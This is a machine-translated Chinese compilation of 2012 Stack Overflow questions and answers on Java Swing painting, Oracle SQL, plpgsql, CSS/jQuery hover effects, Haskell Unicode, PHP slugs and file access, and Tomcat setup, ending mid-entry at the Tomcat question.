我所做的：用户与 DnD 动作交互，可传输对象到达画布，调用我创建的更新图形方法。该方法仅使用已经创建的图形 2d 对象并使用它绘制图像。我检查了 DnD 操作，该对象在画布类中正确接收，我能够使用 System.out.println 将它们打印出来。

一个与我的功能相似的示例代码，

油漆类：

```
 import java.awt.Color;
import java.awt.Graphics;
import java.awt.Graphics2D;

import javax.swing.JPanel;

public class PaintPanel extends JPanel{

    private Graphics2D drawImage;

    public PaintPanel()
    {

    }

    @Override
    public void paint(Graphics g) {
         drawImage = (Graphics2D) g;
         drawImage.setColor(Color.WHITE);
         drawImage.fillRect(0, 0, getWidth(), getHeight());
    }

    public void updateGraphics(int length,int width)
    {
        drawImage.setColor(Color.black);
        drawImage.drawRect(100, 150, length, width);
        repaint();
    }

} 
```

大型机类：

```
 import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;

public class MainPaint extends JFrame{

    public MainPaint()
    {
        setTitle("test paint");
        setSize(400,400);
        setLayout(new BorderLayout());

        final PaintPanel paintPan = new PaintPanel();
        JButton testButon = new JButton("Display shape");
        add(paintPan,BorderLayout.CENTER);
        add(testButon,BorderLayout.PAGE_END);

        testButon.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent arg0) {
                paintPan.updateGraphics(50,50);
                repaint();
            }
        });
        setVisible(true);
    }

    public static void main(String[] args)
    {
        new MainPaint();
    }

} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-26T11:17:27.273

```
Graphics2D drawImage;  //source of the problem! 
```

不要尝试缓存`Graphics`（或`Graphics2D`）实例！反而：

1.  将新对象添加到列表
2.  打电话`repaint()`。
3.  在`paintComponent(Graphics)`绘制对象列表。

另一种方法是使用 a`BufferedImage`作为绘图对象。有关 示例，请参[见此答案。](https://stackoverflow.com/questions/14037284/draw-in-an-image-inside-panel/14037856#14037856)

![](../Images/417ceabb5cfbf2c589f0431dd6961071.png)

* * *

## 更新 - 基于最新代码的 SSCCE。

![按下按钮后的 MainPaint](../Images/6ede6d16f70d0a138687fafeea0cc898.png)

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class MainPaint extends JFrame {

    public MainPaint() {
        setTitle("test paint");
        setSize(400, 400);
        setLayout(new BorderLayout());

        final PaintPanel paintPan = new PaintPanel();
        JButton testButon = new JButton("Display shape");
        add(paintPan, BorderLayout.CENTER);
        add(testButon, BorderLayout.PAGE_END);

        testButon.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent arg0) {
                paintPan.updateGraphics(50, 50);
                repaint();
            }
        });
        setVisible(true);
    }

    public static void main(String[] args) {
        new MainPaint();
    }
}

class PaintPanel extends JPanel {

    private int x, y;
    private Color color = null;

    public PaintPanel() {
        setBackground(Color.ORANGE);
    }

    @Override
    public void paintComponent(Graphics g) {
        super.paintComponent(g);
        Graphics2D drawImage = (Graphics2D) g;
        if (color != null) {
            drawImage.setColor(color);
            drawImage.drawRect(100, 150, x, y);
        }
    }

    public void updateGraphics(int length, int width) {
        color = Color.RED;
        x = length;
        y = width;
        repaint();
    }
} 
```

### 笔记

该代码仍有许多需要更改的地方。我决定停止在按钮单击时显示矩形的最早变体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:10:46.397

我认为您需要调用该`validate()`方法。

# php - 邮件旁边的提供商图标

> ID：14039686
> 
> 赞同：0
> 
> 时间：2012-12-26T11:03:35.747
> 
> 标签：php, email, icons

我正在设置一个小工具来从 PHP 中发送邮件/时事通讯。现在我想添加一个显示在每封邮件中的自定义图标，但不知道如何实现这一点。

有一些公司，比如 Facebook 和 Paypal，已经在使用它。这些图标至少在 iPhone 和 MacOSX 的 Sparrow 上受支持，但可能对于许多其他客户端......

Sparrow 的示例截图：

[查看 Sparrow 的示例屏幕截图](https://i.stack.imgur.com/whb4z.png)

![在此处输入图像描述](../Images/4e170801081b20d5b9344409e5b0d0e9.png)

任何人都可以给我一个关于如何实现这样的事情的提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:31:39.593

There's nothing in the RFCs for mail headers to define any icons to show. Most programs doing so will do this based on your contact list or some kind of internal association list (the case here I guess). As an alternative, the program could use services such as Gravatar, but there's really nothing you can do when composing the mails.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:43:15.823

如前所述，对此没有本机解决方案。但是，如果您只想显示提供程序图标，您可以在数据库中设置一个包含一堆域和图标的表。然后解析发件人电子邮件地址中的域并检查数据库中是否有任何图标。

您还可以获取域的图标并将其显示出来。

# sql - 作业未运行时如何检查

> ID：14039688
> 
> 赞同：1
> 
> 时间：2012-12-26T11:03:40.433
> 
> 标签：sql, oracle, date-arithmetic

我有一个表，其中有一些与执行一些程序的 oracle 作业相关的数据。这里是查询和数据格式。

```
SELECT SRLNUM, TABLE_NAME, PURPOSE, LAST_UPDATE, DUR,
TO_DATE (TO_CHAR (LAST_UPDATE, 'MM/DD/YYYY HH:MI:SS AM'),'MM/DD/YYYY HH:MI:SS AM')+ DUR / (24 * 60) RUNTIME
FROM V_DASHJOBS 
```

这是具有工作详细信息的表的数据

![在此处输入图像描述](../Images/a7cfefc4601cb8fe15c593d9d729cfb2.png)

问题是我有什么方法可以使用查询来检测作业尚未在其上运行，`RUNTIME`如果作业尚未在其上运行，`RUNTIME`则标志`0`应返回，如果已运行`1`则应返回。

我`RUNTIME`通过将 DUR 添加到 last_update 来计算，而且我想给作业 30 分钟的放松时间，该作业可以从实际运行时延迟 30 分钟运行

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:38:19.347

您可以使用这样的查询来获取时间之间的差异。

```
select (last_update+ duration/1440) - last_update  from dual; 
```

希望持续时间是以分钟为单位的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T12:05:39.313

我们可以使用 Oracle 的 DATE 数据类型进行算术运算，因此您对 RUNTIME 的计算过于复杂。

此查询接受您的查询并添加一个 CASE 语句以将派生的 RUNTIME 与当前日期时间进行比较。如果我正确理解了您的要求，这将允许您确定作业是否按计划运行。

```
with data as (
    SELECT SRLNUM
          , TABLE_NAME
          , PURPOSE
          , LAST_UPDATE
          , DUR
          , LAST_UPDATE+ (DUR / (24 * 60)) RUNTIME
    FROM V_DASHJOBS )
select data.*
       , case when sysdate < data.runtime then 1 else 0 end as haz_run
       , case when sysdate < data.runtime + (1/48) then 1 else 0 end as haz_run_with_slack
from data
/ 
```

第二个 CASE() 语句为派生运行时增加了额外的半小时，以满足您的补充要求，“该作业可以比实际运行时晚 30 分钟运行”。

# emacs - 配置文件模块化 dotmacs

> ID：14039693
> 
> 赞同：1
> 
> 时间：2012-12-26T11:04:15.817
> 
> 标签：emacs, profiling, dot-emacs

我的 emacs 是模块化的（在 中使用 ~20 个负载`init.el`）。我想加快我的开始时间。我知道[http://www.emacswiki.org/emacs/ProfileDotEmacs](http://www.emacswiki.org/emacs/ProfileDotEmacs)，但这不允许我更深入地研究我的配置。我怎样才能将其分析到更精细的水平？

# html - 不正确的 SWF 阶段尺寸

> ID：14039694
> 
> 赞同：1
> 
> 时间：2012-12-26T11:04:40.653
> 
> 标签：html, flash

我需要一个 swf 文件来填充整个 html 页面。但遗憾的是，我未能使其按预期工作。即使 SWF 确实填满了整个页面，它的尺寸也显示错误。这就是我所说的：[http ://tinypic.com/r/w7k75i/6](http://tinypic.com/r/w7k75i/6)

如您所见，swf 位于窗口的末尾，但尺寸为 1024x768（左下角的文本），并且从未触发“舞台调整大小”事件（0- 最后一个数字）。这在我的 PC 上打开 swf 时非常有效，但在嵌入 html 页面时却不行。

有什么建议么？谢谢。

更新：忘了提，我是这样嵌入的： swfobject.embedSWF("flash.swf", "content", "100%", "100%", "9.0.0");

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:17:24.510

您可能嵌入错误。使用[swfobject](http://code.google.com/p/swfobject/)可以为自己省去很多痛苦。

尝试将高度宽度设置为 100% 和包含它的 div。

```
swfobject.embedSWF(swfUrl, id, width, height, ...) 
```

# java - 使用 Jama 将矩阵表示为数组

> ID：14039702
> 
> 赞同：0
> 
> 时间：2012-12-26T11:05:23.703
> 
> 标签：java, matrix, jama

我正在使用 Jama 来计算特征向量和特征值，并且效果很好。

问题是有时将矩阵中的列提取到数组中会导致错误的值。

有人碰到过吗？我该如何处理？

我附上了我使用的代码：

```
import weka.core.matrix.EigenvalueDecomposition;
import weka.core.matrix.Matrix;

public class Main6 {
    public static void main(String[] args) {
        double[][] m = {{1,0,1},{0,1,0},{1,1,1}};
        EigenvalueDecomposition e = new EigenvalueDecomposition(new Matrix(m));

        double[] imgValue = e.getImagEigenvalues();
        double[] realValue = e.getRealEigenvalues();

        double[] columns = e.getV().getColumnPackedCopy();
        int rowDim = e.getV().getRowDimension();

        for(int i = 0; i<e.getImagEigenvalues().length; i++){
            System.out.println("\n<"+imgValue[i] + "," + realValue[i]+">");
            for(int j=i*rowDim;j<(i+1)*rowDim;j++)
                System.out.print(columns[j]+" ");
        }
        System.out.println("\n\n"+e.getV());

    }
} 
```

结果是：

```
 OUTPUT:

    <0.0,2.0>
    0.7071067811865475 0.0 0.7071067811865475 
    <0.0,0.0>
    -0.7071067811865475 0.0 0.7071067811865475 
    <0.0,1.0>
    -1.0 1.0 -2.220446049250313E-16 

    According to the debugger, the matrix is:
      0.71 -0.71 -1   
      0     0     1   
      0.71  0.71  0   

    the matrix is:

      1 0 1
      0 1 0
      1 1 1 
```

我真的很感激任何关于它为什么会发生的建议或见解。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:15:29.703

你把 X 轴和 Y 轴混在一起了（行与列）我不确定哪一个是正确的。如果你“调试”输出是由`toString()`那很可能是正确的。

# javascript - 无法在创建的实例上调用 refresh() 或任何 View 类方法

> ID：14039705
> 
> 赞同：2
> 
> 时间：2012-12-26T11:05:40.807
> 
> 标签：javascript, extjs, auto-update

在我的 ExtJS 4.0 应用程序中，我已经创建并初始化了一个视图，但是从我的一个控制器中，我尝试`refresh()`在控制器中创建它的实例后使用它来更新它。

```
//Following code is within a controller.
var myView = this.getView('MyView').create();
console.log(myView); //this logs entire Map with methods and other members.
myView.refresh(); //doesn't work. 
```

基本上，记录的`myView`对象显示存储中的数据已更新，但页面上未反映相同，因此我尝试调用`refresh()`View 对象，但会引发错误，说明该方法未定义。

这里有什么问题？

PS：我是 ExtJS 的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:27:39.797

如果您的视图尚未呈现，则可能会发生这种情况。尝试这个：

```
myView.on('afterrender', function (self) { 
    self.refresh() 
}); 
```

# html - HTML5 App Cache-FALLBACK 下的内容应该是什么？

> ID：14039707
> 
> 赞同：4
> 
> 时间：2012-12-26T11:05:47.410
> 
> 标签：html, html5-appcache

请解释 .appcache 文件中的 FALLBACK 部分。文件offline.html 应该包含什么。CACHE SECTION 和 FALLBACK SECTION 有什么区别。我能够理解 Cache 部分可能包含 css 和 js 文件，但是 fallback 部分有什么用。

当我在我的 demo.appcache 中给出如下内容时

```
 CACHE:
 style.css
 script.js

 NETWORK:
 *

 FALLBACK: 
```

这是否意味着排除 style.css 和 script.js 所有其他文件都需要网络连接？

请解释

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-05T05:04:38.387

如果没有找到离线版本并且您没有连接到互联网，则后备是要提供的 html 文档（以及任何支持的 css 和 js 文件）。

这是对所有部分的一个很好的解释：http: [//diveintohtml5.info/offline.html](http://diveintohtml5.info/offline.html)

```
FALLBACK:
/ /offline.html 
```

> 现在看看后备部分。此缓存清单中的后备部分只有一行。该行的第一部分（在空格之前）不是 URL。这实际上是一个 URL 模式。单个字符 (/) 将匹配您网站上的任何页面，而不仅仅是主页。当您尝试在离线时访问页面时，您的浏览器会在应用缓存中查找它。如果您的浏览器在 appcache 中找到该页面（因为您在在线时访问了该页面，并且该页面当时已隐式添加到 appcache 中），那么您的浏览器将显示该页面的缓存副本。如果您的浏览器在 appcache 中没有找到该页面，而不是显示错误消息，它将显示页面 /offline.html，如后备部分中该行的后半部分所指定的那样。

# postgresql - plpgsql 错误“RETURN NEXT 在函数中不能有参数与 OUT 参数”在表返回函数中

> ID：14039720
> 
> 赞同：18
> 
> 时间：2012-12-26T11:06:49.370
> 
> 标签：postgresql, exception-handling, plpgsql

我在 PostgreSQL 9.2 中有一个 plpgsql 函数，它返回一个表。该函数运行几个 SELECT，它们返回与函数相同的列，然后根据某些检查返回这些结果或引发异常。我能看到的唯一方法是使用 FOR ... LOOP，但我想不出一种方便的方法来返回行。

我想做这样的事情：

```
CREATE OR REPLACE FUNCTION my_function()
RETURNS TABLE(column1 integer, column2 boolean, ...)
AS $BODY$
DECLARE
    result_row RECORD;
BEGIN
    FOR result_row IN (SELECT * FROM other_function_returning_same_columns()) LOOP
        IF something_wrong_with(result_row) THEN
            RAISE EXCEPTION 'Something went wrong';
        END IF;

        RETURN NEXT result_row;
    END LOOP;
END
$BODY$ LANGUAGE plpgsql STABLE; 
```

这给了我一个错误：

> 错误：RETURN NEXT 不能在带有 OUT 参数的函数中有参数

我不确定为什么 Postgres 在这里抱怨，因为我的代码看起来很像[文档](http://www.postgresql.org/docs/9.2/static/plpgsql-control-structures.html)中的示例，除了我的函数返回 TABLE 而不是 SETOF。没有 OUT 参数。

我最终设法让它使用

```
RETURN QUERY SELECT result_row.column1, result_row.column2, ...; 
```

但是必须一直列出所有列是丑陋且难以维护的。我相信一定有更好的方法。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-12-26T11:19:54.123

[**`RETURN NEXT`**](https://www.postgresql.org/docs/12/plpgsql-control-structures.html#id-1.8.8.8.3.4)只返回当前持有的输出参数。[手册](https://www.postgresql.org/docs/12/plpgsql-control-structures.html#id-1.8.8.8.3.4)：

> 如果你用输出参数声明了函数，那么只写`RETURN NEXT`不带表达式。

你反对：

> 没有`OUT`参数。

输出参数在函数参数中使用关键字`OUT`or声明`INOUT`，**或者**`RETURNS`在您的子句中隐式声明：

```
RETURNS TABLE(column1 integer, column2 boolean, ...) 
```

这里`column1`和`column2`也是`OUT`参数。

这应该这样做：

```
CREATE OR REPLACE FUNCTION my_function()
  RETURNS TABLE(column1 integer, column2 boolean, ...)
  LANGUAGE plpgsql STABLE AS
$func$
BEGIN
   FOR column1, column2, ... IN 
      SELECT * FROM other_function_returning_same_columns()
   LOOP
      IF something_wrong_with(column1, column2, ...) THEN
         RAISE EXCEPTION 'Something went wrong';
      END IF;

      RETURN NEXT;
   END LOOP;
END
$func$; 
```

### 注册类型更简单

您可以使用已注册的复合类型进一步简化：

```
CREATE TYPE mytype (column1 integer, column2 boolean, ...); 
```

或者，如果您的类型恰好与表定义匹配，那么您已经拥有该类型，因为每个表名都可以用作 PostgreSQL 中的类型名。然后简化：

```
CREATE OR REPLACE FUNCTION my_function()
  RETURNS SETOF mytype
  LANGUAGE plpgsql STABLE AS
$func$
DECLARE
   _r mytype;
BEGIN
   FOR _r IN 
     SELECT * FROM other_function_returning_same_columns()
   LOOP
      IF something_wrong_with(_r) THEN
         RAISE EXCEPTION 'Something went wrong';
      END IF;

      RETURN NEXT _r;
   END LOOP;
END
$func$; 
```

### 改组！

如果您将`RAISE`命令集成到您的辅助函数`something_wrong_with()`中，反转逻辑并更方便地命名它`everything_groovy()`，那么您可以完全替换`my_function()`为这个简单的查询：

```
SELECT *
FROM   other_function_returning_same_columns() f
WHERE  everything_groovy(f); 
```

或者将 集成`RAISE`到基本功能`other_function_returning_same_columns()`中以进一步简化（并使其更快）。如果您只想`RAISE EXCEPTION`在某些情况下使用，您可以随时添加一个参数（使用默认值）来打开/关闭它。

# css - 在悬停 div 时更改 body bgcolor，仅使用 CSS

> ID：14039723
> 
> 赞同：7
> 
> 时间：2012-12-26T11:07:08.380
> 
> 标签：css

我希望当我悬停一个元素（一个用css制作的盒子）时，`background color`身体的颜色从一种颜色变为另一种颜色，例如白色变为红色。问题是这应该只使用css而不是javascript来完成。如果必须使用 javascript，则颜色应在鼠标移出时变回以前的颜色。

- - - - - - - -编辑 - - - - - - - -

实际上我正在尝试这个：

```
body{backgroung: #000;}
#div{some properties}
body #div:hover{background: #fff;} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-26T11:31:39.167

纯 CSS 实验：

[http://jsfiddle.net/Tymek/yrKRX/](http://jsfiddle.net/Tymek/yrKRX/)

**HTML**

```
<div id="trigger"></div>
<div id="bg"></div>​ 
```

**CSS**

```
body {
    height: 100%;
}

#bg {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    widht: 100%;
    height: 100%;
    z-index: 1;
    background: #EEE;
}

#trigger {
    position: absolute;
    width: 200px;
    height: 136px;
    top: 50%;
    left: 50%;
    margin: -68px 0 0 -100px;
    background: #333;
    z-index: 2;
}

/* KEY */
#trigger:hover ~ #bg {
    background: #EE0;
}​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:19:17.573

请像这样使用

```
<html>
   <body>

     <style type="text/css">   

       .top{  
           background:red;
       }

       .top2{   
           background:white;
       }
     </style>

    <div class="top" onmouseover="this.className='top2'" 
                    onmouseout="this.className='top'">Here</div>
  </body>
</html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T11:23:38.023

使用`:hover`选择器。除非您正在做一些非常不同的事情，否则这似乎很简单。

检查以下示例以供参考：

```
.classname {
    background-color:white;
 } 

 .classname:hover {
    background-color:red;
 } 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-12-26T11:32:17.887

**[工作小提琴](http://jsfiddle.net/zN983/1/)**

您的代码中有许多拼写错误，例如拼写错误和`background`视为ID ( )。`backgroung``div``#div`

**CSS**（*对错别字的解释*）

```
body{background: #000;}                /*backgroung (mis-spelled)*/
div{width:100px;                       /*#div (treated as ID)*/
    height:100px;
    border:1px solid black;} 
```

要将鼠标悬停在父标签上，您必须**强制**使用 javascript 或 jQuery。您可能会怀疑为什么没有 css 属性来选择父标签，如果是这样，那么您可以通过这个**[有趣的链接](http://css-tricks.com/parent-selectors-in-css/)**。在大多数情况下，为了避免父选择器的概念，我们可以避免在 CSS 中使用定位（查看 Tymek 的解决方案）。

**jQuery**

```
$(document).ready(function(){
    $("div").hover(function(){
        $(this).parent(this).css('background-color','red');
    });

    $("div").mouseleave(function(){
        $(this).parent(this).css('background-color','white');
    });
});​ 
```

假设您是 jQuery 新手，请在`head`HTML 标记中提供一个链接，如下所示，以使上述功能正常工作。

```
<script src="http://code.jquery.com/jquery-latest.min.js"
    type="text/javascript"></script> 
```

检查这个**[工作小提琴](http://jsfiddle.net/zN983/1/)**

# haskell - 如何让 Haskell 或 ghci 能够显示汉字并运行汉字命名脚本？

> ID：14039726
> 
> 赞同：14
> 
> 时间：2012-12-26T11:07:14.297
> 
> 标签：haskell, unicode, character, cjk, ghci

我想制作一个 Haskell 脚本来读取我的 /home 文件夹中的文件。但是有很多以汉字命名的文件，Haskell 和 Ghci 无法管理。似乎 Haskell 和 Ghci 不擅长显示 UTF-8 字符。

这是我遇到的：

```
Prelude> "让Haskell或者Ghci能正确显示汉字并且读取汉字命名的文档"

"\35753Haskell\25110\32773Ghci\33021\27491\30830\26174\31034\27721\23383\24182\19988\35835\21462\27721\23383\21629\21517\30340\25991\26723" 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-12-26T11:21:01.490

```
Prelude> putStrLn "\35753Haskell\25110\32773Ghci\33021\27491\30830\26174\31034\27721\23383\24182\19988\35835\21462\27721\23383\21629\21517\30340\25991\26723"
让Haskell或者Ghci能正确显示汉字并且读取汉字命名的文档 
```

GHC 处理 unicode 就好了。这些是你应该知道的事情：

它使用您的系统编码在从控制台读取或写入控制台时从字节转换为字符并返回。由于它在您的示例中正确地完成了从字节到字符的转换，我想说您的系统编码设置正确。

`show`on 函数`String`具有有限的输出字符集。GHCI 使用该`show`函数打印计算表达式的结果，并使用该`print`函数将传入的值转换为`String`表示形式。

和函数用于实际将 a 写入控制台`putStr`，就像提供给它们一样。`putStrLn``String`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-31T13:38:52.177

感谢卡尔，我用`putStrLn`它来包装我的功能：

```
ghci> let removeNonUppercase st = [c | c <- st, c `elem` ['А'..'Я']]
ghci> putStrLn (removeNonUppercase "Ха-ха-ха! А-ха-ха!")
ХА 
```

一切正常！

# jquery - 导航菜单中（a＆a：hover）之间的jQuery淡入/淡出？

> ID：14039727
> 
> 赞同：3
> 
> 时间：2012-12-26T11:07:17.523
> 
> 标签：jquery, fadein, transition, fadeout, jquery-hover

我正在尝试在导航菜单上的（a 和 a:hover）之间进行淡入/淡出转换

导航菜单的结构如下：

```
<div class="menubar">
  <ul id="mainmenu">
    <li><a href="">Home</a></li>
    <li><a href="">Team</a></li>
    <li><a href="">News</a></li>
    <li><a href="">EVENTS</a></li>
    <li><a href="">MultiMedia</a></li>
    <li><a href="">Fans</a></li>
    <li><a href="">Forums</a></li>
  </ul>
</div> 
```

a 标签的 CSS 样式如下：

```
#mainmenu li a {
    color: #fdb813;
    line-height: 50px;
    padding:12px 25px;
    text-shadow: 0px 1px 4px #ccc;
    text-decoration:none;
}
#mainmenu li a:hover{
    color: #000;
    background: url(images/menuhover.png) repeat;
    text-shadow: 0px 1px 4px #777;
} 
```

我想用fadeIn和fadeOut在正常状态和悬停状态之间进行转换。我不是jQuery专家，所以我尝试过破解代码，但我总是得到一个消失的菜单！

-编辑-

好吧，我要清楚，这就是我希望过渡的方式：

悬停：背景图像和文本颜色应逐渐出现。而原始文本保持原样（它不应该在过渡开始时消失）

hover-out: bg-img 和 text 应该逐渐消失（显示原始状态）

-编辑2-

到目前为止，我已经成功地使用以下部分进行了淡入淡出转换。

```
<script type="text/javascript">
 $(document).ready(function(){
  $('#mainmenu li a').hover(
                function () {
                    $(this).css('opacity',0.1).animate({opacity: 1},250);
                }, //this is called on hover in
                function () {
                    $(this).addClass('hovered');
                    $(this).fadeOut(function(){
                        $(this).removeClass('hovered').fadeIn(250);
                    });
                } //this is called on hover out
            );
       }); 
</script> 
```

但是，fadeOut 上的过渡有点奇怪。我愿意接受任何建议。注意：类 'hovered' 是一个匹配 a:hover CSS 选择器的类

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:33:37.493

我假设您想在鼠标悬停时执行一些动画。下面是您可以使用的简单代码。

1.  将悬停事件绑定到您的每个锚点，您可以执行以下操作

    ```
    $('#mainmenu').find('a').hover(function(){

       //comes here upon hover
    }); 
    ```

2.  执行淡入淡出或淡出或动画。下面是这样做的超级简单的代码。

    ```
     <script>
     $(document).ready(function(){
         $('#mainmenu').find('a').hover(
           function(){
                $(this).animate({opacity: 0.25}, 200, function() { }); 
               } ///gets called when hover in
          ,
           function(){
                 $(this).animate({opacity: 1}, 200, function() {}); 

            }//gets called when hover out
         );
         }); 
      </script> 
    ```

所以基本上你是在一个锚上悬停时执行动画，然后删除悬停时产生的效果。这是一个非常简单的案例，致力于为您提供一个想法。

由于您想为背景图像设置动画，因此无法通过 jquery animate 方法来实现，而是通过简单的逻辑来实现。试试下面的脚本：

```
 <script>
         $(document).ready(function(){
             $('#mainmenu').find('a').hover(
             function(){
               $(this).animate({opacity: 0}, 'slow', function() {
                        $(this).css({'background-image': 'url(images/hovermenu.png)'})
                        .animate({opacity: 1});
                        }); 
             } ///gets called when hover in
              ,
             function(){
               $(this).animate({opacity: 0}, 'slow', function() {
                            $(this).css({'background-image': 'url()'})
                        .animate({opacity: 1});
                        }); 
             });
             }); 
          </script> 
```

所以现在你正在做的是，

悬停时：您将锚的不透明度设置为 0，将背景图像分配给它，然后将其不透明度设置为 1

悬停时：您将锚点的不透明度设置为 0，删除其背景 - 图像，然后将其不透明度设置为 0

它接近你想要的。看，您想要的是使您的文本静态并对其背景图像产生影响，这对于您当前的菜单结构是不可能的。

您将不得不将您的文本和背景图像分开，即保留在锚点下方的任何其他元素的动画背景图像。

再次给你一个想法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:24:38.723

您只能将 css 转换和 jQuery 用作后备。以下是一些帮助链接：

*   [http://www.onextrapixel.com/2011/10/17/animating-colors-using-css3-transitions-with-jquery-fallback/](http://www.onextrapixel.com/2011/10/17/animating-colors-using-css3-transitions-with-jquery-fallback/)
*   [https://developer.mozilla.org/en-US/docs/CSS/Tutorials/Using_CSS_transitions](https://developer.mozilla.org/en-US/docs/CSS/Tutorials/Using_CSS_transitions)
*   [http://oli.jp/2010/css-animatable-properties/](http://oli.jp/2010/css-animatable-properties/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:37:02.117

```
The Js code is below :

$("a").hover(function(){

        $(this).fadeOut(500);
        $(this).fadeIn(500);

    },function(){}); 
```

第一个函数在悬停时调用，第二个在悬停时调用。

您需要包含一个最新的 jquery：

```
<script src="http://code.jquery.com/jquery-latest.js"></script> 
```

你可以在这里看到效果：`http://jsfiddle.net/WrspV/`

# mysql - zend -mysql 使用一个字段值的值到另一个字段名

> ID：14039729
> 
> 赞同：0
> 
> 时间：2012-12-26T11:07:20.867
> 
> 标签：mysql, zend-framework, row

假设我有一张桌子

```
 emp_id              Date         total
   1                    1             10    
   1                    3             25
   2                    2             20
   3                    2             15
   3                    3             25 
```

我的结果应该看起来

```
 id       1        2               3

  1       10        0              25
  2       20        0              0
  3        0       15              25 
```

如何在 Zend Framework 中使用 Zend_Db_Table 或 Zend_Db_Select 执行此查询？非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:32:53.907

这是一般方法：

```
$select =  $this->getadapter()->select();
//not required with a DbTable model to provide the adapter
$select->from('Table');
$select->where('column = ?', 'value');//if required
$select->group('date');
$this->getAdapter()->fetchAll($select); 
```

# php - 如何存储敏感文件并只允许某些用户访问

> ID：14039731
> 
> 赞同：0
> 
> 时间：2012-12-26T11:07:40.843
> 
> 标签：php, mysql, database, security, directory

我有一个网络应用程序，可让用户存储包含敏感信息的文件。到目前为止，我已经编写了代码，以便如果他们查看他们的文件，他们会通过**view.php?id=xx**并通过数据库进行检查以确认他们被允许查看所述文件。例如，John 将**“information.pdf”**上传到位于**“www.mysite.com/uploads”**的文件夹**“uploads”**，因此文件的确切路径为**“http://www.mysite.com/uploads” /information.pdf"**，并且在数据库中，该文件的 id 为 2，因此他将通过**view.php?id=2**访问它。

 ********问题**

我如何阻止任何人去确切的路径并查看他的敏感文件？

**我做了什么**

编写代码以仅在用户访问我的网站时才允许访问文件，而不是直接访问。

我已经查看了相同标题的推荐问题，但是没有运气。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:11:29.053

不要将其放在可公开访问的路径中，例如`http://www.mysite.com/uploads/`. 把它放在 htdocs 之外，只允许通过你的`view.php`

如果您想为所有者提供下载功能，只需创建一个`download.php`检查权限的方法，`view.php`但不是查看它，而是让用户下载。******

# php - 获取 slug 并使用破折号编写内容

> ID：14039732
> 
> 赞同：0
> 
> 时间：2012-12-26T11:07:53.483
> 
> 标签：php, .htaccess

我在从 slug 用破折号分隔的页面获取内容时遇到问题。例如，如果我去`www.example.com/home`它工作正常，但如果我去`www.example.com/about-us`它会得到一个错误`Trying to get property of non-object`，正如错误所说的是关于这条线的；

```
<h1><?php echo $page->Title; ?></h1>
<?php echo $page->Content; ?> 
```

我有一个从数据库中获取 slug 的函数，看起来像这样；

```
function getSlug($name = null) {
global $db;
if ($name) {
    $query = $db->prepare('SELECT * FROM pages WHERE `Title` = ? LIMIT 1');
    $query->execute(array($name));
    return $query->fetchObject();
}
} 
```

我还有一个函数可以创建如下所示的 slug；

```
function createSlug($string){
    $string = preg_replace( '/[«»""!?,.!@£$%^&*{};:()]+/', '', $string );
    $string = strtolower($string);
    $slug=preg_replace('/[^A-Za-z0-9-]+/', '-', $string);
    return $slug;
} 
```

在我的 htaccess 中，我得到了规则`RewriteRule ^([a-zA-Z0-9-/]+)$ index.php?name=$1 [L]`。

要获取内容，我使用了以下代码；

```
<?php
    include 'header.php';
    $slug = create_slug($_GET['name']);
    $page = getSlug($slug);
?>
<div class="container">
    <h1><?php echo $page->Title; ?></h1>
    <?php echo $page->Content; ?>
<?php include 'footer.php'; ?> 
```

我真的不知道问题是什么。任何帮助将非常感激。

提前致谢。亲切的问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:39:03.197

我已经通过在我的数据库中添加一个名为 Slug 的行来解决这个问题，我认为如果我希望 slug 与标题不同，这也会更好。

感谢@sk8terboi87 的努力

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:12:33.953

检查 ModRewrite 模块是否已启用，并且在 .htaccess 中检查以下行是否添加到顶部。

```
RewriteEngine On 
```

# tomcat - 如何在 Linux 中将 Web 应用程序添加到 Tomcat 6

> ID：14039736
> 
> 赞同：2
> 
> 时间：2012-12-26T11:08:10.817
> 
> 标签：tomcat, web-applications

我安装了 tomcat 6 并想添加我的网络应用程序来启动 URL。我遵循[如何在 Tomcat 7.0 中设置 Web 应用程序的上下文路径](https://stackoverflow.com/questions/7276989/howto-set-the-context-path-of-a-web-application-in-tomcat-7-0)

我在 /conf/Catalina/localhost/ 路径中创建了 root.xml。在 root.xml 文件中我有这个

```
<Context path="/root" docBase="/scratch/rsarda/view_storage/web/appv2"/> 
```

当我启动 url localhost:8080/root 时，出现“HTTP Status 404”错误。我也没有在 /logs 中看到任何错误。

请让我知道我错过了什么。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T22:55:24.493

